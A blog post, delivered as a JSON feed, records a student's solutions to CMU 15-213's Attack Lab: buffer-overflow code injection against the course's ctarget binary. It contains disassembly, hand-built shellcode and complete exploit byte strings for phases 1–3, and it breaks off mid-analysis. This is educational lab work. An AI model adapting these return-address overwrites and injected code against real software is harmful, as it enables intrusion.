{
    "version": "https://jsonfeed.org/version/1",
    "title": "望春风 • All posts by \"15-213 lab\" category",
    "description": "计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影",
    "home_page_url": "https://salvely.github.io/blog",
    "items": [
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 3-Attack lab 实验记录",
            "date_published": "2024-02-29T02:36:22.000Z",
            "content_html": "<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>文件夹中的几个重要文件如下：</p>\n<ul>\n<li>cookie.txt: 8 个 16 进制数字的码，用于唯一标记</li>\n<li>ctarget: 准备用于 code injection attack</li>\n<li>farm.c: 用于 return oriented programming attacks</li>\n<li>hex2raw: 用于生成攻击的二进制文件</li>\n<li>README.txt: 介绍了文件夹中文件的内容</li>\n<li>rtarget: 准备用于 return oriented programming attacks</li>\n</ul>\n<p>实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。</p>\n<h2 id=\"Part-I-Code-Injection-Attack\"><a href=\"#Part-I-Code-Injection-Attack\" class=\"headerlink\" title=\"Part I: Code Injection Attack\"></a>Part I: Code Injection Attack</h2><h3 id=\"Phase-1：覆盖返回地址\"><a href=\"#Phase-1：覆盖返回地址\" class=\"headerlink\" title=\"Phase 1：覆盖返回地址\"></a>Phase 1：覆盖返回地址</h3><p>在这个 phase 中，我们需要引导 ctarget 中的<code>test</code>函数返回到<code>touch1</code>函数。首先我们对<code>ctarget</code>做反汇编。其中<code>test</code>函数的汇编代码如下：</p>\n<pre><code>0000000000401968 &lt;test&gt;:\n  401968:\t48 83 ec 08          \tsub    $0x8,%rsp\n  40196c:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401971:\te8 32 fe ff ff       \tcallq  4017a8 &lt;getbuf&gt;\n  401976:\t89 c2                \tmov    %eax,%edx\n  401978:\tbe 88 31 40 00       \tmov    $0x403188,%esi\n  40197d:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401982:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401987:\te8 64 f4 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  40198c:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401990:\tc3                   \tretq\n</code></pre>\n<p>而<code>touch1</code>函数的地址是<code>0x4017c0</code>。</p>\n<p>在这其中我们调用<code>getbuf</code>函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是<code>0x401976</code>，我们需要将其换成<code>0x4017c0</code>。我们现在对<code>getbuf</code>进行反汇编(nop 指令省去)：</p>\n<pre><code>00000000004017a8 &lt;getbuf&gt;:\n  4017a8:\t48 83 ec 28          \tsub    $0x28,%rsp\n  4017ac:\t48 89 e7             \tmov    %rsp,%rdi\n  4017af:\te8 8c 02 00 00       \tcallq  401a40 &lt;Gets&gt;\n  4017b4:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017b9:\t48 83 c4 28          \tadd    $0x28,%rsp\n  4017bd:\tc3                   \tretq\n</code></pre>\n<p>对该过程进行分析：</p>\n<ol>\n<li>留出 40 个字节的位置</li>\n<li>rdi &#x3D; rsp</li>\n<li>调用 gets 函数</li>\n<li>eax &#x3D; 1</li>\n<li>恢复栈空间</li>\n<li>返回</li>\n</ol>\n<p>要完成这个实验，我们需要直到几个值：</p>\n<ol>\n<li>buf 的位置: 应该进入<code>getbuf</code>后，<code>%rsp - 40</code>之后的位置</li>\n<li>返回地址在栈中位置: 在调用<code>callq</code>函数时，我们会将<code>%rsp - 8</code>，然后将返回地址压入，然后将<code>%rip</code>设置为<code>getbuf</code>函数的地址。（同理，调用<code>retq</code>的时候，我们会把栈顶的地址赋给<code>%rip</code>，然后让<code>%rsp + 8</code>，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完<code>callq</code>之后<code>%rsp</code>的位置。</li>\n<li><code>touch1</code>函数的地址:<code>0x4017c0</code></li>\n</ol>\n<p>这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a,那个是换行符）。因为是小端法，最后 8 个字节应该是<code>0xc0 0x17 0x40</code>。</p>\n<p>该阶段输入内容存储在<code>phase1.txt</code>中，内容如下：<code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40</code>。输入命令<code>./hex2raw &lt; phase1.txt | ./ctarget -q</code>进行测试(<code>-q</code>是指运行在本地电脑上)，结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch1!: You called touch1()\nValid solution for level 1 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40\n</code></pre>\n<p>成功！</p>\n<h3 id=\"Phase-2：在-buf-中插入攻击代码并覆盖返回地址\"><a href=\"#Phase-2：在-buf-中插入攻击代码并覆盖返回地址\" class=\"headerlink\" title=\"Phase 2：在 buf 中插入攻击代码并覆盖返回地址\"></a>Phase 2：在 buf 中插入攻击代码并覆盖返回地址</h3><p>在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让<code>test</code>函数返回到<code>touch2</code>，而且我们需要让<code>val</code>的值等于<code>cookie</code>的值。（而且这里我们不能直接让<code>test</code>返回到打印<code>Touch2!</code>那一句，因为前面有<code>vlevel = 2</code>，后面需要验证这个值是不是 2，如果直接跳到那一句的话，<code>vlevel</code>没有赋值，也肯定不等于 2，验证就会失败）。</p>\n<p><code>touch2</code>的函数源码如下：</p>\n<pre><code class=\"c\">void touch2(unsigned val)\n&#123;\n    vlevel = 2; /* Part of validation protocol */\n    if (val == cookie) &#123;\n        printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val);\n        validate(2);\n    &#125; else &#123;\n        printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val);\n        fail(2);\n    &#125;\n    exit(0);\n&#125;\n</code></pre>\n<p><code>touch2</code>的汇编函数如下：</p>\n<pre><code>00000000004017ec &lt;touch2&gt;:\nseg1:\n  4017ec:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4017f0:\t89 fa                \tmov    %edi,%edx\n  4017f2:\tc7 05 e0 2c 20 00 02 \tmovl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;\n  4017f9:\t00 00 00\n  4017fc:\t3b 3d e2 2c 20 00    \tcmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;\n  401802:\t75 20                \tjne    401824 &lt;touch2+0x38&gt;\n  401804:\tbe e8 30 40 00       \tmov    $0x4030e8,%esi\n  401809:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40180e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401813:\te8 d8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401818:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40181d:\te8 6b 04 00 00       \tcallq  401c8d &lt;validate&gt;\n  401822:\teb 1e                \tjmp    401842 &lt;touch2+0x56&gt;\nseg2:\n  401824:\tbe 10 31 40 00       \tmov    $0x403110,%esi\n  401829:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40182e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401833:\te8 b8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401838:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40183d:\te8 0d 05 00 00       \tcallq  401d4f &lt;fail&gt;\nseg3:\n  401842:\tbf 00 00 00 00       \tmov    $0x0,%edi\n  401847:\te8 f4 f5 ff ff       \tcallq  400e40 &lt;exit@plt&gt;\n</code></pre>\n<p>从上述汇编代码可以看出，<code>val</code>的值在最开始存在<code>edi</code>处。那么我们的目的就是让这个值等于<code>cookie</code>。而且<code>cookie</code>的位置是<code>6044e4</code>。所以我们的目的是让<code>%edi</code>寄存器的值等于<code>6044e4</code>处的值。</p>\n<p>要实现攻击，我们的 buffer overflow 必须完成四步动作：</p>\n<ol>\n<li>让 return address 等于 buf 的开头</li>\n<li>在 buf 开头插入赋值语句，让<code>%edi = *0x6044e4</code></li>\n<li>让 return address &#x3D; touch2 的入口地址(<code>0x4017ec</code>)</li>\n<li>调用<code>ret</code></li>\n</ol>\n<p>首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后<code>%rsp</code>在哪里。<br>我们着重观察 3 个地方的<code>$rsp</code>：</p>\n<ol>\n<li>调用<code>getbuf</code>之前: 0x5561dca8</li>\n<li>调用<code>getbuf</code>之后: 0x5561dca0</li>\n<li>调用<code>rsp = rsp - 40</code>之后: 0x5561dc78</li>\n</ol>\n<p>那么我们可以判断 buf 的起始位置是<code>0x5561dc78</code>，返回地址的位置在其后 40 个字节处，也就是<code>0x5561dca0</code>。那么我们需要让 return address(buf 最后 8 个字节)的值等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>\n<p>第二条要生成的指令应该是:</p>\n<pre><code>movl $0x6044e4,%eax\nmovl (%eax),%edi\n</code></pre>\n<p>第三条要生成的指令应该是：</p>\n<pre><code>subq $0x8,%rsp\nmovl 0x4017ec,($rsp)\n</code></pre>\n<p>最后一条插入的指令是<code>ret</code>，在这个过程中，<code>%rsp</code>处的内容会被赋值给<code>%rip</code>，<code>%rsp</code>会自动加上 8。</p>\n<p>最后插入数条<code>nop</code>指令实现 PC 的顺序累加。</p>\n<p>由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中：</p>\n<pre><code>    movl $0x6044e4,%eax\n    movl (%eax),%edi\n    subq $0x8,%rsp\n    movl $0x4017ec,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>然后使用<code>gcc -c ph2.s</code>生成<code>ph2.o</code>文件，然后使用<code>objdump -d ph2.o &gt; ph2.d</code>，打开<code>ph2.d</code>，有如下内容：</p>\n<pre><code>\nph2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tb8 e4 44 60 00       \tmov    $0x6044e4,%eax\n   5:\t67 8b 38             \tmov    (%eax),%edi\n   8:\t48 83 ec 08          \tsub    $0x8,%rsp\n   c:\tc7 04 24 ec 17 40 00 \tmovl   $0x4017ec,(%rsp)\n  13:\tc3                   \tretq\n  14:\t90                   \tnop\n  15:\t90                   \tnop\n  16:\t90                   \tnop\n  17:\t90                   \tnop\n</code></pre>\n<p>那么我们所需要的字节就是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3</code>，共 20 字节。后续再插入 20 个字节的<code>nop</code>(0x90)</p>\n<p>完整的字符串是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55</code>，我将其保存在<code>phase2.txt</code>中。</p>\n<blockquote>\n<p>注：一开始把<code>0x5561dc78</code>打成了<code>0x5564dc78</code>导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。</p>\n<p>此外，注入代码的时候需要手动添加<code>ret</code>指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。</p>\n</blockquote>\n<p>结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch2!: You called touch2(0x59b997fa)\nValid solution for level 2 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:2:B8 E4 44 60 00 67 8B 38 48 83 EC 08 C7 04 24 EC 17 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55\n</code></pre>\n<p>成功！</p>\n<h3 id=\"Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址\"><a href=\"#Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址\" class=\"headerlink\" title=\"Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址\"></a>Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</h3><p>在 phase 3 中，我们需要让程序在<code>getbuf</code>后，运行<code>touch3</code>函数，其注入方式和 phase 2 类似。（此处需要利用<code>vlevel = 3</code>进行跳转后验证，因此和上次一样，我们不能直接跳转到<code>Touch3!</code>语句，还是需要注入代码，将<code>%rdi</code>设置为<code>cookie</code>的值，然后再引导程序跳转到<code>touch3</code>的开头语句）。<code>touch3</code>函数的 C 语言版本如下：</p>\n<pre><code class=\"c\">/* Compare string to hex represention of unsigned value */\nint hexmatch(unsigned val, char *sval)\n&#123;\n    char cbuf[110];\n    /* Make position of check string unpredictable */\n    char *s = cbuf + random() % 100;\n    sprintf(s, &quot;%.8x&quot;, val);\n    return strncmp(sval, s, 9) == 0;\n&#125;\n\nvoid touch3(char *sval)\n&#123;\n    vlevel = 3; /* Part of validation protocol */\n    if (hexmatch(cookie, sval)) &#123;\n        printf(&quot;Touch3!: You called touch3(&quot;%s&quot;)\\n&quot;, sval);\n        validate(3);\n    &#125; else &#123;\n        printf(&quot;Misfire: You called touch3(&quot;%s&quot;)\\n&quot;, sval);\n        fail(3);\n    &#125;\n    exit(0);\n&#125;\n</code></pre>\n<h4 id=\"一开始的错误解答\"><a href=\"#一开始的错误解答\" class=\"headerlink\" title=\"一开始的错误解答\"></a>一开始的错误解答</h4><p>这里的差别在于我们输入的<code>string</code>是一个<code>cookie</code>的字符串表示。我们对<code>touch3</code>做反汇编看看<code>cookie</code>的字符串表示存在哪里？</p>\n<pre><code>   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n</code></pre>\n<p>我们输入<code>x/s 0x6044e4</code>看看结果：</p>\n<pre><code>(gdb) x/s 0x6044e4\n0x6044e4 &lt;cookie&gt;:      &quot;&quot;\n</code></pre>\n<p>这里同样，可以看出来和上一次的<code>cookie</code>放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值<code>%rdi</code>设置为<code>0x6044e4</code>位置的值。而这次<code>%rdi</code>指向输入的字符串，我们需要做的是将<code>%rdi</code>设置为<code>0x6044e4</code>。</p>\n<p>此外，<code>touch3</code>的入口地址为<code>0x4018fa</code>。因此在最后需要让 return address 等于这个值。</p>\n<p>那么总体的注入和上次遵循一样的步骤：</p>\n<ol>\n<li>让 return address 等于 buf 的开头(<code>0x5561dc78</code>)</li>\n<li>在 buf 开头插入赋值语句，让<code>%edi = 0x6044e4</code></li>\n<li>让 return address &#x3D; touch3 的入口地址(<code>0x4018fa</code>)</li>\n<li>调用<code>ret</code></li>\n</ol>\n<p>综上，这次的调用语句是：</p>\n<pre><code>    movl $0x6044e4,%edi\n    subq $0x8,%rsp\n    movl $0x4018fa,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>将其保存在<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>生成<code>ph3.o</code>文件，再<code>objdump -d ph3.o &gt; ph3.d</code>，生成<code>ph3.d</code>文件。</p>\n<p>文件内容如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf e4 44 60 00       \tmov    $0x6044e4,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   \tnop\n</code></pre>\n<p>那么其一直到<code>ret</code>的字节即为<code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节。将其字节复制到<code>phase3.txt</code>的最前面。添加 23 个<code>nop</code>(<code>0x90</code>)凑齐 40 个字节，最后 8 个字节的值必须等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>\n<p>完整字符串如下：</p>\n<pre><code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55\n</code></pre>\n<p>输入<code>./hex2raw &lt; phase3.txt | ./ctarget </code>。结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Misfire: You called touch3(&quot;���Y&quot;)\nFAIL: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55\n</code></pre>\n<p>最后确实跳转到了<code>touch3</code>，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)</p>\n<h4 id=\"忽略随机栈空间的不正确解答\"><a href=\"#忽略随机栈空间的不正确解答\" class=\"headerlink\" title=\"忽略随机栈空间的不正确解答\"></a>忽略随机栈空间的不正确解答</h4><p>我们最早是认为，应该让<code>%edi</code>指向<code>0x6044e4</code>，也就是<code>cookie</code>字符串所在的位置，来让<code>%edi</code>和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，<code>cookie</code>不是个字符串，还是个<code>unsigned</code>类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让<code>输入的字符串</code>和<code>打印出来的 cookie 的值</code>相同。所以这里不能让<code>%rdi</code>指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给<code>%rdi</code>，然后让<code>%rdi</code>和<code>cookie</code>的打印版进行比较。</p>\n<p>那么<code>cookie</code>的值是多少？我们使用<code>p /x cookie</code>命令打印一下：</p>\n<pre><code>(gdb) p /x cookie\n$4 = 0x59b997fa\n</code></pre>\n<p>所以输入的字符串应该是<code>0x59b997fa</code>。</p>\n<p>经过阅读 attacklab.pdf，作者给出了以下几个提示：</p>\n<ol>\n<li>攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x）</li>\n<li>字符串最后应该有个 0，输入<code>man ascii</code>在 Linux 中查找 ascii 表</li>\n<li>攻击代码应该让<code>%rdi</code>的值等于这个字符串的起始地址</li>\n<li><code>hexmatch</code>和<code>strncmp</code>可能会覆盖一部分<code>getbuf</code>中的 buf，注意不要让你的攻击字符串被覆盖掉。</li>\n</ol>\n<p>那么初始的准备工作应该是：</p>\n<ol>\n<li>确定插入字符串和攻击代码的有效区域，防止被<code>hexmatch</code>和<code>strncmp</code>影响到</li>\n<li>查找<code>cookie</code>字符串的编码，加上一个<code>\\0</code>，并插入到攻击代码之前</li>\n<li>确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节</li>\n</ol>\n<p>在攻击代码中所做的工作应该是：</p>\n<ol>\n<li>让<code>%rdi = 插入字符串的起始位置</code></li>\n<li>将<code>touch3</code>的起始位置插入到返回地址处</li>\n<li>调用<code>ret</code>返回</li>\n<li>通过多个<code>nop</code>填充字符串（也可以不填充？）</li>\n</ol>\n<p>我们首先确定<code>getbuf</code>的<code>buf</code>范围，<code>hexmatch</code>的辐射范围和<code>strncmp</code>的辐射范围。</p>\n<p>通过<a href=\"#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80\">前文</a>我们分析过：</p>\n<ol>\n<li>调用<code>getbuf</code>之前: <code>0x5561dca8</code></li>\n<li>调用<code>getbuf</code>之后: <code>0x5561dca0</code></li>\n<li>调用<code>rsp = rsp - 40</code>之后: <code>0x5561dc78</code></li>\n</ol>\n<p>可以了解到<code>buf</code>的范围是：<code>0x5561dc78 ~ 0x5561dc9f</code>，<code>buf</code>后 8 个字节的返回地址的位置是<code>0x5561dca0</code>。</p>\n<p>对<code>touch3</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function touch3:\n   0x00000000004018fa &lt;+0&gt;:     push   %rbx\n   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx\n   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &lt;vlevel&gt;\n   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi\n   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;\n   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax\n   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;\n   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx\n   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi\n   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi\n   0x0000000000401927 &lt;+45&gt;:    mov    $0x0,%eax\n   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi\n   0x0000000000401936 &lt;+60&gt;:    callq  0x401c8d &lt;validate&gt;\n   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;\n   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx\n   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi\n   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi\n   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax\n   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi\n   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;\n   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi\n   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对<code>hexmatch</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function hexmatch:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n   0x0000000000401850 &lt;+4&gt;:     add    $0xffffffffffffff80,%rsp\n   0x0000000000401854 &lt;+8&gt;:     mov    %edi,%r12d\n   0x0000000000401857 &lt;+11&gt;:    mov    %rsi,%rbp\n   0x000000000040185a &lt;+14&gt;:    mov    %fs:0x28,%rax\n   0x0000000000401863 &lt;+23&gt;:    mov    %rax,0x78(%rsp)\n   0x0000000000401868 &lt;+28&gt;:    xor    %eax,%eax\n   0x000000000040186a &lt;+30&gt;:    callq  0x400db0 &lt;random@plt&gt;\n   0x000000000040186f &lt;+35&gt;:    mov    %rax,%rcx\n   0x0000000000401872 &lt;+38&gt;:    movabs $0xa3d70a3d70a3d70b,%rdx\n   0x000000000040187c &lt;+48&gt;:    imul   %rdx\n   0x000000000040187f &lt;+51&gt;:    add    %rcx,%rdx\n   0x0000000000401882 &lt;+54&gt;:    sar    $0x6,%rdx\n   0x0000000000401886 &lt;+58&gt;:    mov    %rcx,%rax\n   0x0000000000401889 &lt;+61&gt;:    sar    $0x3f,%rax\n   0x000000000040188d &lt;+65&gt;:    sub    %rax,%rdx\n   0x0000000000401890 &lt;+68&gt;:    lea    (%rdx,%rdx,4),%rax\n   0x0000000000401894 &lt;+72&gt;:    lea    (%rax,%rax,4),%rax\n   0x0000000000401898 &lt;+76&gt;:    shl    $0x2,%rax\n   0x000000000040189c &lt;+80&gt;:    sub    %rax,%rcx\n   0x000000000040189f &lt;+83&gt;:    lea    (%rsp,%rcx,1),%rbx\n   0x00000000004018a3 &lt;+87&gt;:    mov    %r12d,%r8d\n   0x00000000004018a6 &lt;+90&gt;:    mov    $0x4030e2,%ecx\n   0x00000000004018ab &lt;+95&gt;:    mov    $0xffffffffffffffff,%rdx\n   0x00000000004018b2 &lt;+102&gt;:   mov    $0x1,%esi\n   0x00000000004018b7 &lt;+107&gt;:   mov    %rbx,%rdi\n   0x00000000004018ba &lt;+110&gt;:   mov    $0x0,%eax\n   0x00000000004018bf &lt;+115&gt;:   callq  0x400e70 &lt;__sprintf_chk@plt&gt;\n   0x00000000004018c4 &lt;+120&gt;:   mov    $0x9,%edx\n   0x00000000004018c9 &lt;+125&gt;:   mov    %rbx,%rsi\n   0x00000000004018cc &lt;+128&gt;:   mov    %rbp,%rdi\n   0x00000000004018cf &lt;+131&gt;:   callq  0x400ca0 &lt;strncmp@plt&gt;\n   0x00000000004018d4 &lt;+136&gt;:   test   %eax,%eax\n   0x00000000004018d6 &lt;+138&gt;:   sete   %al\n   0x00000000004018d9 &lt;+141&gt;:   movzbl %al,%eax\n   0x00000000004018dc &lt;+144&gt;:   mov    0x78(%rsp),%rsi\n   0x00000000004018e1 &lt;+149&gt;:   xor    %fs:0x28,%rsi\n   0x00000000004018ea &lt;+158&gt;:   je     0x4018f1 &lt;hexmatch+165&gt;\n   0x00000000004018ec &lt;+160&gt;:   callq  0x400ce0 &lt;__stack_chk_fail@plt&gt;\n   0x00000000004018f1 &lt;+165&gt;:   sub    $0xffffffffffffff80,%rsp\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n   0x00000000004018f9 &lt;+173&gt;:   retq\nEnd of assembler dump.\n</code></pre>\n<p>对<code>strncmp</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function strncmp_ifunc:\n   0x00007ffff7e54710 &lt;+0&gt;:     endbr64\n   0x00007ffff7e54714 &lt;+4&gt;:     mov    0x14c745(%rip),%rcx        # 0x7ffff7fa0e60\n   0x00007ffff7e5471b &lt;+11&gt;:    lea    0xe4b0e(%rip),%rax        # 0x7ffff7f39230 &lt;__strncmp_avx2&gt;\n   0x00007ffff7e54722 &lt;+18&gt;:    movabs $0x90000000002,%rdx\n   0x00007ffff7e5472c &lt;+28&gt;:    movabs $0x10000000002,%rsi\n   0x00007ffff7e54736 &lt;+38&gt;:    and    0xc8(%rcx),%rdx\n   0x00007ffff7e5473d &lt;+45&gt;:    cmp    %rsi,%rdx\n   0x00007ffff7e54740 &lt;+48&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e54742 &lt;+50&gt;:    mov    0x70(%rcx),%edx\n   0x00007ffff7e54745 &lt;+53&gt;:    test   $0x100000,%edx\n   0x00007ffff7e5474b &lt;+59&gt;:    je     0x7ffff7e5475d &lt;strncmp_ifunc+77&gt;\n   0x00007ffff7e5474d &lt;+61&gt;:    lea    0xdf78c(%rip),%rax        # 0x7ffff7f33ee0 &lt;__strncmp_sse42&gt;\n   0x00007ffff7e54754 &lt;+68&gt;:    testb  $0x80,0xcc(%rcx)\n   0x00007ffff7e5475b &lt;+75&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e5475d &lt;+77&gt;:    and    $0x2,%dh\n   0x00007ffff7e54760 &lt;+80&gt;:    lea    0xaef9(%rip),%rax        # 0x7ffff7e5f660 &lt;__strncmp_sse2&gt;\n   0x00007ffff7e54767 &lt;+87&gt;:    lea    0xc51a2(%rip),%rdx        # 0x7ffff7f19910 &lt;__strncmp_ssse3&gt;\n   0x00007ffff7e5476e &lt;+94&gt;:    cmovne %rdx,%rax\n   0x00007ffff7e54772 &lt;+98&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>其中与栈相关的指令包括：</p>\n<pre><code>hex2match前(touch3中)：\n    push   %rbx\n    callq hex2match\nhex2match:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n                                retq\nhex2match后：\n    callq strncmp\nstrncmp:\n    